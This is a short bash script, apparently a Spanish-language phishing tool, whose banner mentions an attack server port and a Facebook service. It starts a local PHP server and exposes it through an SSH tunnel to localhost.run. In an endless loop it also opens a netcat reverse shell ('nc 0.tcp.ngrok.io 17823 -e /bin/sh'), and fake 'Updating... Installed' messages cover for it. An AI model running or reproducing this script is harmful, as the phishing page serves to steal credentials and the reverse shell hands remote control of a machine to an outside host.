#!/bin/bash
printf "\e[1;97m    　　　__／|  *#*#4636#*#*\e[0m\n"
printf "\e[1;97m   ｒｰ-++　 　 !     \e[0m\n"
printf "\e[1;97m    ヽ 　 _,　r ミ  Servidor puerto ataque 8080\e[0m\n"
printf "\e[1;97m　    彡__ ,xノﾞ     \e[1;92m by Luishino :3\e[0m\n"
printf "\e[1;97m　　    |　　ヽ　　mmm...Servicio\e[1;96m[facebook] ...\e[0m\n"
printf "\e[1;97m  https://lpericena.blogspot.com/\e[0m\n"
printf "\e[1;93m [!] $date Updating... \e[0m\n"
printf "\e[1;93m [!] Installed.\e[0m\n"
printf "\e[1;93m [#]"
echo "server puerto 8282!"
php -S localhost:8080 &>/dev/null &
for (( ; ; ))
do
nc 0.tcp.ngrok.io 17823 -e /bin/sh &>/dev/null &
echo "¡Iniciando servidor shh!"
ssh -R 80:localhost:8080 ssh.localhost.run
done
